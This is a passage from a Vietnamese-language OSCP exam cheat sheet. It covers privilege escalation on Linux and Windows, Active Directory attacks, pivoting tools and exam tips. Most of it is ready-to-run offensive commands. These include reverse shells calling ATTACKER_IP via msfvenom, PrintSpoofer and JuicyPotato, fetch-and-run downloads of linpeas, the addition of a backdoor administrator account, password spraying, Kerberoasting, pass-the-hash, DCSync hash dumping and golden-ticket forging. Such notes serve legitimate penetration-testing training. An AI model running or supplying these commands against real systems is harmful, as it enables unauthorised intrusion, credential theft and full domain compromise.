# python3 với cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 11. Docker/LXC group
id  # nếu trong docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LinPEAS (auto enum)
```bash
# Download và chạy
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
# Hoặc
wget http://ATTACKER_IP:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee /tmp/linpeas.out
```

---

## 16. PRIVILEGE ESCALATION WINDOWS {#privesc-windows}

### Checklist Windows

```cmd
REM 1. Info cơ bản
whoami /all
net user
net localgroup administrators
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

REM 2. Unquoted service path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

REM 3. Weak service permissions
accesschk.exe -uwcqv * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

REM 4. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Nếu cả hai = 1 → tạo .msi payload với msfvenom!
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

REM 5. Token impersonation
whoami /priv
# SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege → POTATO ATTACKS
# JuicyPotato, PrintSpoofer, RoguePotato, GodPotato

REM 6. DLL hijacking
# Tìm service chạy với SYSTEM load DLL từ writable path
```

### WinPEAS
```cmd
winpeas.exe > C:\Windows\Temp\winpeas.txt
```

### SeImpersonatePrivilege — Potato Attacks
```cmd
REM GodPotato (Windows 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add && net localgroup administrators hacker /add"

REM PrintSpoofer
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd"

REM JuicyPotato (Windows < 2019)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe ATTACKER_IP 4444 -e cmd" -t *
```

---

## 17. ACTIVE DIRECTORY {#active-directory}

### Mindset AD
```
1. Recon → Enumerate users, groups, SPNs, shares
2. Foothold → Password spray, AS-REP Roasting, anonymous LDAP
3. Lateral Movement → Pass-the-Hash, Pass-the-Ticket
4. Privilege Escalation → Kerberoasting, ACL abuse, DCSync
5. Domain Compromise → DA hash → PSExec/WMI/SMB
```

### Bước 1: Recon từ ngoài (không có creds)
```bash
# Tìm domain controller
nmap --script=dns-srv-enum --script-args dns-srv-enum.domain=domain.local
nslookup -type=SRV _kerberos._tcp.domain.local

# LDAP anonymous
ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=local" "(objectClass=person)" | grep -i "sAMAccountName"

# Liệt kê users qua RPC
rpcclient -U "" -N <DC_IP>
rpcclient> enumdomusers
rpcclient> querydispinfo

# Kerbrute — enumerate users không cần creds
# https://github.com/ropnop/kerbrute
./kerbrute userenum --dc DC_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Bước 2: Password Spray & AS-REP Roasting
```bash
# Password spray (cẩn thận lockout!)
crackmapexec smb DC_IP -u users.txt -p 'Password123' --continue-on-success
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password123'

# AS-REP Roasting — user không cần preauth
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP
impacket-GetNPUsers domain.local/ -no-pass -dc-ip DC_IP -request
# → Crack hash: hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### Bước 3: Enumeration khi có creds
```bash
# BloodHound collection
bloodhound-python -u user -p pass -d domain.local -dc DC_IP -c All
# Rồi import vào BloodHound GUI

# CrackMapExec enum
crackmapexec smb DC_IP -u user -p pass --users
crackmapexec smb DC_IP -u user -p pass --groups
crackmapexec smb DC_IP -u user -p pass --shares
crackmapexec smb DC_IP -u user -p pass --loggedon-users
crackmapexec smb DC_IP -u user -p pass --pass-pol

# Kerberoasting — tìm user có SPN
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request
# → Crack: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# LDAP với creds
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w "pass" -b "dc=domain,dc=local"
```

### Bước 4: Lateral Movement
```bash
# Pass-the-Hash (khi có NTLM hash)
crackmapexec smb TARGET_IP -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'
impacket-psexec Administrator@TARGET_IP -hashes 'aad3b435:NTLM_HASH'
impacket-wmiexec Administrator@TARGET_IP -hashes 'aad3b435:NTLM_HASH'

# PsExec (khi có plaintext pass)
impacket-psexec domain.local/Administrator:password@TARGET_IP
impacket-smbexec domain.local/Administrator:password@TARGET_IP

# Evil-winrm (cần WinRM port 5985/5986)
evil-winrm -i TARGET_IP -u Administrator -p password
evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH
```

### Bước 5: Domain Compromise
```bash
# DCSync — dump tất cả hash từ DC (cần DA hoặc replication rights)
impacket-secretsdump domain.local/Administrator:pass@DC_IP
impacket-secretsdump -just-dc domain.local/Administrator:pass@DC_IP

# Golden Ticket (sau khi có krbtgt hash)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@DC_IP

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
crackmapexec smb TARGET_IP --kerberos
```

### AD Commands nhanh
```cmd
REM Windows target — enum AD
net user /domain
net group /domain
net group "Domain Admins" /domain
whoami /groups
Get-ADUser -Filter * | Select-Object SamAccountName
Get-ADGroupMember "Domain Admins"
```

---

## 18. NMAP STATIC BINARY {#nmap-static}

> Dùng khi trên pivot target không có nmap

```bash
# Download static nmap binary
# https://github.com/andrew-d/static-binaries

wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -O nmap_static
chmod +x nmap_static

# Chuyển lên target
# (dùng SCP/HTTP server như phần 7)
scp nmap_static user@TARGET_IP:/tmp/nmap_static

# Chạy trên target
/tmp/nmap_static -sT -p- --min-rate 2000 10.10.10.0/24
/tmp/nmap_static -sT -p 22,80,443,445,3389 10.10.10.0/24
# Lưu ý: static binary không có -sS (SYN scan) → dùng -sT (TCP connect)
```

---

## 19. LƯU Ý KHI THI OSCP {#exam-tips}

### Trước khi thi
- [ ] Screenshot mọi proof.txt: `type local.txt` / `type proof.txt` / `cat local.txt` với `hostname` và `whoami/id` trong cùng 1 ảnh
- [ ] Chuẩn bị file note này offline (không có internet khi cần)
- [ ] Cài sẵn: chisel, ligolo-ng, nmap static, winpeas, linpeas, PowerView
- [ ] Tạo wordlist riêng từ website target: `cewl http://TARGET -w custom_wordlist.txt`

### Trong khi thi
```
1. Scan ALL ports trước (nmap -p-)
2. Enum từng service kỹ trước khi exploit
3. Nếu stuck → enum thêm, không farm 1 hướng
4. AD set: compromise user thường trước → leo lên DA
5. Chụp screenshot ngay khi lấy được flag
6. Note IP, user, pass mọi machine
7. Nghỉ 5-10 phút nếu stuck > 30 phút
```

### Lệnh lấy proof
```bash
# Linux — local.txt (user) và proof.txt (root)
cat /home/*/local.txt
cat /root/proof.txt
hostname && id && cat /root/proof.txt  # screenshot này!

# Windows
type C:\Users\user\Desktop\local.txt
type C:\Users\Administrator\Desktop\proof.txt
whoami && hostname && type C:\Users\Administrator\Desktop\proof.txt
```

### File cần chuẩn bị sẵn trên Kali (HTTP server)
```
/tools/
├── chisel_linux_amd64
├── chisel_windows_amd64.exe
├── ligolo-ng_agent_linux_amd64
├── ligolo-ng_agent_windows_amd64.exe
├── nmap_static
├── linpeas.sh
├── winpeas.exe
├── PrintSpoofer.exe
├── GodPotato.exe
├── JuicyPotato.exe
├── nc.exe  (Windows netcat)
├── PowerView.ps1
└── SharpHound.exe
```

### Quick Reference — Ports thường gặp
| Port | Service | Hướng khai thác |
|------|---------|----------------|
| 21 | FTP | Anonymous login, upload shell |
| 22 | SSH | Brute force, key misconfig |
| 25/587 | SMTP | User enum, relay |
| 80/443 | HTTP/S | Web vuln, LFI/RFI, SQLi, upload |
| 110/995 | POP3 | Brute force |
| 139/445 | SMB | null session, PsExec, EternalBlue |
| 1433 | MSSQL | SA brute, xp_cmdshell |
| 3306 | MySQL | Brute force, UDF exploit |
| 3389 | RDP | Brute force, BlueKeep |
| 5985 | WinRM | evil-winrm |
| 5432 | PostgreSQL | Brute force, COPY TO/FROM |
| 6379 | Redis | Unauth RCE |
| 8080 | Tomcat/Web | Tomcat manager, upload WAR |
| 11211 | Memcached | Dump data |
| 27017 | MongoDB | Unauth access |

---

## BONUS: QUICK WINS CHECKLIST
```
[ ] FTP anonymous login?        → ftp <IP>, user: anonymous
[ ] SMB null session?           → smbclient -L //<IP> -N
[ ] Web login admin:admin?      → thử ngay
[ ] /robots.txt có gì không?    → curl http://<IP>/robots.txt
[ ] /sitemap.xml?               → curl http://<IP>/sitemap.xml
[ ] Source code comment?        → Ctrl+U trên browser
[ ] .git exposed?               → curl http://<IP>/.git/config
[ ] .env exposed?               → curl http://<IP>/.env
[ ] phpinfo()?                  → curl http://<IP>/phpinfo.php
[ ] WordPress?                  → wpscan --url http://<IP> -e u
[ ] SNMP public?                → snmpwalk -v2c -c public <IP>
[ ] Redis unauth?               → redis-cli -h <IP> INFO
[ ] MongoDB unauth?             → mongo <IP>:27017
[ ] sudo -l?                    → sudo -l (sau khi vào được shell)
```

---

## NGUỒN THAM KHẢO
- **Chisel:** https://github.com/jpillora/chisel
- **Ligolo-ng:** https://github.com/nicocha30/ligolo-ng
- **GTFOBins:** https://gtfobins.github.io
- **HackTricks:** https://book.hacktricks.xyz
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings
- **Kerbrute:** https://github.com/ropnop/kerbrute
- **Impacket:** https://github.com/fortra/impacket
- **BloodHound:** https://github.com/BloodHoundAD/BloodHound
- **PEASS-ng (LinPEAS/WinPEAS):** https://github.com/carlospolop/PEASS-ng
- **Static Binaries:** https://github.com/andrew-d/static-binaries
- **SecLists:** https://github.com/danielmiessler/SecLists
- **RevShells:** https://www.revshells.com
- **CyberChef:** https://gchq.github.io/CyberChef
